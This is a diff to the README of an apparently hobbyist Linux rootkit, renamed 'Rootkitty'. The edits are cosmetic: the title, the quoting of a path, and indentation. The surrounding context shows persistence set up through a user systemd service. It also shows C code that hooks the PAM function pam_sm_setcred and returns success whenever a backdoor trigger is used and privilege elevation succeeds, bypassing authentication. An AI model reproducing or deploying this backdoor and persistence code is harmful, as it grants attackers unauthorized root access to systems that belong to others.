@@ -1,9 +1,8 @@
-# Very Badly Done Rootkit - Showerkit
-
+# Rootkitty
 ## Persistence Using SystemD services
 
 place file here:
-> `~/.config/systemd/user/<your_filename>.service`
+`~/.config/systemd/user/<your_filename>.service`
 
 should look like this:
 ```rootkatz.service
@@ -74,7 +73,7 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const cha
     og_pam_sm_setcred = dlsym(RTLD_NEXT, "pam_sm_setcred");
     if (is_backdoor_used(pamh)){
         if(elevation()==0){
-            return PAM_SUCCESS;
+return PAM_SUCCESS;
         }
     }
     return og_pam_sm_setcred(pamh, flags, argc, argv);
@@ -84,7 +83,7 @@ int drop_privileges(uid_t original_uid, gid_t original_gid) {
     if (setegid(original_gid)==-1){
         return -1;
     }
-    if (seteuid(original_uid) == -1) {
+  if (seteuid(original_uid) == -1) {
         return -1;
     }
     return 0;
